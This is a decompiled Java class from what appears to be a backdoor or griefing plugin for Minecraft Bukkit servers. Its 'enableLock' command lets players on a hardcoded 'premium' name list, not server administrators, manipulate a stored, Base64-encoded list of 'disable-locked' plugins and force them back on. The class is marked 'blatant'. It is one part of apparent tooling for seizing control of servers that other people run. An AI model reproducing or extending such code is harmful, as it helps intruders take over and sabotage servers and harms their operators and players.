/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.util.Base64;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class EnablelockCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("enableLock <plugin>"));
            } else if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
                p2.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
            } else {
                for (String list : DataManager.getData().getStringList("epic-pl")) {
                    Plugin pl2 = Bukkit.getPluginManager().getPlugin(args[1]);
                    byte[] plug = Base64.getEncoder().encode(pl2.getName().getBytes());
                    if (list.contains(new String(plug))) {
                        DataManager.idk.remove(new String(plug));
                        DataManager.getData().set("epic-pl", DataManager.idk);
                        DataManager.saveData();
                        API.enablePlugin(args[1]);
                        p2.sendMessage(Settings.PREFIX(args[1] + " is now enabled and will stay enabled!"));
                        continue;
                    }
                    p2.sendMessage(Settings.PREFIX("This plugin isn't disable locked!"));
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

